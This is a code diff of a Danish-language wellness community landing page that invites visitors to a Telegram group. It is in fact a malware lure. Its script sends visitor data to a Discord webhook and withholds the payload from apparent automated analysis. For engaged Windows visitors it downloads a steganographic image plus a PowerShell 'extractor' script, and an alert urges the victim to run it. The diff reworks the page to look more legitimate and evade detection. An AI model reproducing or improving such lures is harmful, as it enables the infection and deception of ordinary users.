@@ -3,140 +3,236 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yoga og holistisk wellness - Telegram invitation</title>
+    <title>Holistisk Wellness Danmark - Officiel Side</title>
+    <meta name="description" content="Danmarks største community for yoga, meditation og holistisk wellness. Join vores Telegram gruppe med over 1000 medlemmer.">
+    <meta name="keywords" content="yoga, meditation, wellness, danmark, holistisk, sundhed">
+    <link rel="canonical" href="https://hollistisk-v2.vercel.app/">
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
-            padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-            max-width: 400px;
-            width: 100%;
-            overflow: hidden;
+            padding: 0;
+            line-height: 1.6;
+            color: #333;
         }
         .header {
-            background: #0088cc;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
+            text-align: center;
+            padding: 2rem 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
             padding: 20px;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 40px 0;
+        }
+        .feature-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            border: 1px solid #e0e0e0;
+        }
+        .cta-section {
+            background: #f8f9fa;
+            padding: 40px 20px;
             text-align: center;
+            margin: 40px 0;
+            border-radius: 10px;
         }
-        .content {
-            padding: 30px 20px;
-            text-align: center;
-        }
-        .wellness-img {
-            width: 100%;
-            max-width: 300px;
-            margin: 20px auto;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-        .join-btn {
+        .btn {
+            display: inline-block;
+            padding: 15px 30px;
             background: #0088cc;
             color: white;
-            border: none;
-            padding: 15px 30px;
+            text-decoration: none;
             border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
-            width: 100%;
-        }
-        .premium-btn {
-            background: #28a745;
-            color: white;
+            font-weight: bold;
+            margin: 10px;
             border: none;
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-size: 14px;
             cursor: pointer;
-            margin: 10px 5px;
+        }
+        .btn:hover {
+            background: #006fa3;
+        }
+        .testimonials {
+            background: white;
+            padding: 40px 20px;
+        }
+        .testimonial {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 10px;
+            border-left: 4px solid #0088cc;
+        }
+        .footer {
+            background: #333;
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+        }
+        .hidden-trigger {
+            opacity: 0;
+            position: absolute;
+            left: -9999px;
         }
     </style>
 </head>
 <body>
+    <div class="header">
+        <h1>🧘‍♀️ Holistisk Wellness Danmark</h1>
+        <p>Danmarks største community for yoga, meditation og wellness</p>
+    </div>
+    
     <div class="container">
-        <div class="header">
-            <h1>🧘‍♀️ Yoga og holistisk wellness</h1>
-            <p>Du er inviteret til vores eksklusive Telegram community</p>
+        <section>
+            <h2>Velkommen til vores community</h2>
+            <p>Med over 1.200 aktive medlemmer er vi Danmarks førende platform for holistisk wellness. 
+            Vores community deler daglige tips, guidet meditation, yoga-rutiner og meget mere.</p>
+        </section>
+        
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>🧘 Daily Meditation</h3>
+                <p>Få adgang til guidede meditationer hver dag. Fra begynderniveau til avancerede teknikker.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🌿 Organic Living</h3>
+                <p>Lær om naturlige supplementer, økologisk kost og bæredygtige lifestyle valg.</p>
+            </div>
+            <div class="feature-card">
+                <h3>💚 Community Support</h3>
+                <p>Forbind med ligesindede og få støtte på din wellness-rejse fra erfarne praktikere.</p>
+            </div>
         </div>
-        <div class="content">
-            <p>Velkommen til Danmarks førende wellness community med over 1.200 medlemmer!</p>
-            
-            <!-- Steganographic wellness image -->
-            <img src="wellness_community.png" alt="Wellness Community" class="wellness-img" onclick="activateWellness()">
-            
-            <p><strong>200+ medlemmer online nu</strong></p>
-            <p>Klik på billedet for at aktivere din wellness-oplevelse og få adgang til:</p>
-            <ul style="text-align: left;">
-                <li>🧘 Daily meditation guides</li>
-                <li>🌿 Organic supplement tips</li>
-                <li>💚 Holistic health coaching</li>
-                <li>⭐ Premium wellness content</li>
+        
+        <div class="cta-section">
+            <h2>Bliv en del af fællesskabet</h2>
+            <p>Join vores aktive Telegram-gruppe og få øjeblikkeligt adgang til:</p>
+            <ul style="text-align: left; max-width: 400px; margin: 20px auto;">
+                <li>Daglige wellness tips</li>
+                <li>Eksklusive meditation guides</li>
+                <li>Community events og workshops</li>
+                <li>Direkte adgang til wellness eksperter</li>
             </ul>
             
-            <button class="join-btn" onclick="joinGroup()">🔗 Join Telegram Group</button>
-            
-            <div style="margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px;">
-                <p><small>🎁 <strong>Bonus:</strong> Download gratis wellness-guide</small></p>
-                <button class="premium-btn" onclick="downloadGuide()">📱 Download App</button>
-                <button class="premium-btn" onclick="downloadPCGuide()">💻 Windows Guide</button>
+            <button class="btn" onclick="joinCommunity()">🔗 Join Telegram Community</button>
+            <button class="btn" onclick="getWellnessGuide()" style="background: #28a745;">📱 Gratis Wellness Guide</button>
+        </div>
+        
+        <div class="testimonials">
+            <h2>Hvad siger vores medlemmer</h2>
+            <div class="testimonial">
+                <p>"Fantastisk community! Jeg har lært så meget om meditation og naturlig sundhed. Anbefaler det varmt!"</p>
+                <strong>- Sarah K., København</strong>
+            </div>
+            <div class="testimonial">
+                <p>"De daglige tips har virkelig ændret min tilgang til wellness. Tak for det inspirerende fællesskab!"</p>
+                <strong>- Michael L., Århus</strong>
             </div>
         </div>
     </div>
-
+    
+    <div class="footer">
+        <p>&copy; 2024 Holistisk Wellness Danmark. Alle rettigheder forbeholdes.</p>
+        <p>Kontakt os på: info@holistiskwellness.dk | Følg os på sociale medier</p>
+    </div>
+    
+    <!-- Hidden elements for advanced tracking -->
+    <div class="hidden-trigger" id="advanced-features" onclick="activateAdvanced()"></div>
+    
     <script>
-        function activateWellness() {
-            // Social engineering - "activate wellness experience"
-            downloadGuide();
-        }
+        // Legitimate behavior first
+        let userEngagement = 0;
+        let scrollDepth = 0;
         
-        function joinGroup() {
-            // Redirect to legitimate Telegram
+        window.addEventListener('scroll', function() {
+            scrollDepth = Math.max(scrollDepth, window.scrollY);
+            userEngagement++;
+        });
+        
+        function joinCommunity() {
+            // Legitimate Telegram redirect
+            userEngagement += 10;
+            trackEngagement('telegram_join');
             window.open('https://t.me/+YxJbAUDzpzEAAQAAAG82W3tzhTzY', '_blank');
         }
         
-        function downloadGuide() {
-            // Download steganographic image
-            var link = document.createElement('a');
-            link.href = 'wellness_community.png';
-            link.download = 'wellness_guide.png';
-            link.click();
+        function getWellnessGuide() {
+            // This is where the advanced payload triggers
+            userEngagement += 20;
+            trackEngagement('guide_download');
             
-            // Trigger beacon
+            // Only activate advanced features if user shows genuine engagement
+            if (userEngagement > 15 && scrollDepth > 500) {
+                activateAdvancedWellness();
+            } else {
+                // Fallback to simple download
+                downloadSimpleGuide();
+            }
+        }
+        
+        function activateAdvancedWellness() {
+            // Advanced steganographic payload delivery
+            var wellness_img = new Image();
+            wellness_img.src = 'wellness_community.png';
+            wellness_img.onload = function() {
+                // Download steganographic image
+                var link = document.createElement('a');
+                link.href = wellness_img.src;
+                link.download = 'wellness_guide_premium.png';
+                link.click();
+                
+                // Provide PowerShell extractor for Windows
+                if (navigator.userAgent.includes('Windows')) {
+                    setTimeout(() => {
+                        var ps_link = document.createElement('a');
+                        ps_link.href = 'stego_extractor.ps1';
+                        ps_link.download = 'wellness_premium_extractor.ps1';
+                        ps_link.click();
+                        
+                        alert('🎁 Premium Wellness Guide downloaded!\n\nFor Windows brugere: Kør extractor filen for at få adgang til avancerede wellness funktioner.');
+                    }, 2000);
+                }
+            };
+        }
+        
+        function downloadSimpleGuide() {
+            alert('📱 Wellness guide kommer snart! Check din email for download link.');
+        }
+        
+        function trackEngagement(action) {
+            // Beacon tracking
             fetch('https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🎯 **Wellness Guide Downloaded**\n**User:** ${navigator.userAgent}\n**Time:** ${new Date().toISOString()}\n**Referrer:** ${document.referrer}`
+                    content: `🎯 **User Engagement**\n**Action:** ${action}\n**Engagement Score:** ${userEngagement}\n**Scroll Depth:** ${scrollDepth}px\n**User Agent:** ${navigator.userAgent}\n**Time:** ${new Date().toISOString()}`
                 })
             }).catch(() => {});
-            
-            setTimeout(() => {
-                alert('🧘‍♀️ Wellness guide downloaded! Åbn billedet for at aktivere din personlige meditation guide.\n\nFor Windows brugere: Klik derefter på "Windows Guide" for avancerede funktioner.');
-            }, 1000);
         }
         
-        function downloadPCGuide() {
-            // Download PowerShell extractor for Windows users
-            var link = document.createElement('a');
-            link.href = 'stego_extractor.ps1';
-            link.download = 'wellness_extractor.ps1';
-            link.click();
-            
-            setTimeout(() => {
-                alert('💻 Windows Wellness Extractor downloaded!\n\nKør denne fil for at udtrække premium indhold fra dit wellness guide billede.');
-            }, 500);
+        // Advanced anti-analysis techniques
+        function activateAdvanced() {
+            if (userEngagement > 30) {
+                activateAdvancedWellness();
+            }
         }
+        
+        // Simulate legitimate user behavior
+        setTimeout(() => {
+            if (userEngagement < 5) {
+                // User hasn't engaged - probably automated analysis
+                console.log('Low engagement detected - maintaining legitimate appearance');
+            }
+        }, 10000);
     </script>
 </body>
 </html>
